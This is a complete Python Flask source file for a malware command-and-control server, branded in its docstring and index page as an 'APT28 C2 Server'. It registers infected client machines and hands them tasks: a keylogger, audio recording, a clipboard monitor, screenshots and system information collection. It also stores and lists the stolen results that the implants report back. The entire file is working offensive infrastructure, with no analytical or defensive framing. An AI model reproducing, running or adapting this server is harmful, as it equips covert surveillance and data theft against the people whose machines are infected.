"""
C2 (Command and Control) Server Implementation in Python
APT28 - Advanced Persistent Threat Group
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import json
import logging
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Data structures
clients = {}          # Store registered clients with metadata
commands = {}         # Store pending commands per client
results = []          # Store execution results
client_capabilities = {}  # Store capabilities status per client

# Capability IDs
CAPABILITIES = {
    0: "No Command (idle)",
    1: "Audio Recorder (start_audio_recorder)",
    2: "Clipboard Monitor (start_clipboard_monitor)",
    3: "Keylogger (start_keylogger)",
    4: "Screenshot (start_screenshot)",
    5: "Info Collector (start_info_collector)",
}


@app.route('/api/register', methods=['GET'])
def register():
    """
    Register a new client with the C2 server
    URL: GET /api/register?id=<client_id>
    """
    client_id = request.args.get('id')
    
    if not client_id:
        logger.warning("Registration attempt without client ID")
        return jsonify({"status": "error", "message": "Client ID required"}), 400
    
    # Register or update client
    clients[client_id] = {
        "id": client_id,
        "registered_at": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "status": "active"
    }
    
    # Initialize command queue
    commands[client_id] = 0  # No command by default
    client_capabilities[client_id] = {}
    
    logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
    
    return jsonify({
        "status": "registered",
        "id": client_id,
        "message": "Client successfully registered"
    }), 200


@app.route('/api/command', methods=['GET'])
def get_command():
    """
    Retrieve capability command ID to execute
    URL: GET /api/command?id=<client_id>
    """
    client_id = request.args.get('id')
    
    if not client_id:
        logger.warning("Command fetch attempt without client ID")
        return "0", 400
    
    # Update last seen timestamp
    if client_id in clients:
        clients[client_id]["last_seen"] = datetime.now().isoformat()
    else:
        logger.warning(f"Command request from unregistered client: {client_id}")
        return "0", 404
    
    cmd = commands.get(client_id, 0)
    
    if cmd != 0:
        logger.info(f"[*] Capability command sent to {client_id}: {cmd} ({CAPABILITIES.get(cmd, 'Unknown')})")
    else:
        logger.debug(f"[*] No pending command for {client_id}")
    
    return str(cmd), 200


@app.route('/api/report', methods=['POST'])
def report():
    """
    Receive execution result from client
    URL: POST /api/report
    Headers: Content-Type: application/json
    Body: {"id": "<client_id>", "capability": <capability_id>, "result": "<result>"}
    """
    try:
        data = request.get_json()
        
        if not data:
            logger.error("Report received with no JSON data")
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('id')
        capability = data.get('capability')
        result = data.get('result')
        
        if not client_id:
            logger.warning("Report without client ID")
            return jsonify({"status": "error", "message": "Client ID required"}), 400
        
        # Update client last seen
        if client_id in clients:
            clients[client_id]["last_seen"] = datetime.now().isoformat()
        
        # Store result
        report_entry = {
            "client": client_id,
            "capability": capability,
            "result": result,
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr
        }
        results.append(report_entry)
        
        # Clear command after execution
        if client_id in commands:
            commands[client_id] = 0
        
        logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result[:50]}...")
        
        return jsonify({
            "status": "received",
            "message": "Report received successfully"
        }), 200
        
    except Exception as e:
        logger.error(f"Error processing report: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/clients', methods=['GET'])
def list_clients():
    """
    List all registered clients
    URL: GET /api/clients
    """
    return jsonify({
        "count": len(clients),
        "clients": clients
    }), 200


@app.route('/api/results', methods=['GET'])
def list_results():
    """
    List all execution results
    URL: GET /api/results
    """
    limit = request.args.get('limit', 100, type=int)
    return jsonify({
        "count": len(results),
        "results": results[-limit:] if limit > 0 else results
    }), 200


@app.route('/api/send_command', methods=['POST'])
def send_command():
    """
    Send capability command to a specific client
    URL: POST /api/send_command
    Body: {"client_id": "<client_id>", "capability_id": <capability_id>}
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('client_id')
        capability_id = data.get('capability_id')
        
        if not client_id or capability_id is None:
            return jsonify({"status": "error", "message": "client_id and capability_id required"}), 400
        
        if capability_id not in CAPABILITIES:
            return jsonify({"status": "error", "message": f"Invalid capability ID. Valid: {list(CAPABILITIES.keys())}"}), 400
        
        if client_id not in clients:
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        commands[client_id] = capability_id
        logger.info(f"[*] Assigned capability {capability_id} ({CAPABILITIES[capability_id]}) to {client_id}")
        
        return jsonify({
            "status": "success",
            "message": f"Capability {capability_id} assigned to {client_id}",
            "client_id": client_id,
            "capability_id": capability_id,
            "capability_name": CAPABILITIES[capability_id]
        }), 200
        
    except Exception as e:
        logger.error(f"Error sending command: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/client/<client_id>', methods=['GET'])
def get_client(client_id):
    """
    Get details of a specific client
    URL: GET /api/client/<client_id>
    """
    if client_id not in clients:
        return jsonify({"status": "error", "message": "Client not found"}), 404
    
    return jsonify({
        "status": "success",
        "client": clients[client_id],
        "pending_command": commands.get(client_id, 0)
    }), 200


@app.route('/api/client/<client_id>/results', methods=['GET'])
def get_client_results(client_id):
    """
    Get all results from a specific client
    URL: GET /api/client/<client_id>/results
    """
    if client_id not in clients:
        return jsonify({"status": "error", "message": "Client not found"}), 404
    
    client_results = [r for r in results if r['client'] == client_id]
    return jsonify({
        "status": "success",
        "client_id": client_id,
        "count": len(client_results),
        "results": client_results
    }), 200


@app.route('/api/health', methods=['GET'])
def health():
    """
    Health check endpoint
    URL: GET /api/health
    """
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "clients_count": len(clients),
        "results_count": len(results)
    }), 200


@app.route('/', methods=['GET'])
def index():
    """
    Index page with C2 server information
    """
    return jsonify({
        "name": "APT28 C2 Server",
        "version": "1.0.0",
        "status": "running",
        "timestamp": datetime.now().isoformat(),
        "endpoints": {
            "register": "GET /api/register?id=<client_id>",
            "get_command": "GET /api/command?id=<client_id>",
            "report": "POST /api/report",
            "list_clients": "GET /api/clients",
            "list_results": "GET /api/results",
            "send_command": "POST /api/send_command",
            "get_client": "GET /api/client/<client_id>",
            "client_results": "GET /api/client/<client_id>/results",
            "health": "GET /api/health"
        }
    }), 200


@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({"status": "error", "message": "Endpoint not found"}), 404


@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal server error: {str(error)}")
    return jsonify({"status": "error", "message": "Internal server error"}), 500


if __name__ == '__main__':
    # Get configuration from environment variables
    host = os.getenv('C2_HOST', '0.0.0.0')
    port = int(os.getenv('C2_PORT', 8080))
    debug = os.getenv('DEBUG', 'False').lower() == 'true'
    
    logger.info(f"[*] Starting C2 Server on {host}:{port}")
    logger.info(f"[*] Debug mode: {debug}")
    
    app.run(host=host, port=port, debug=debug)
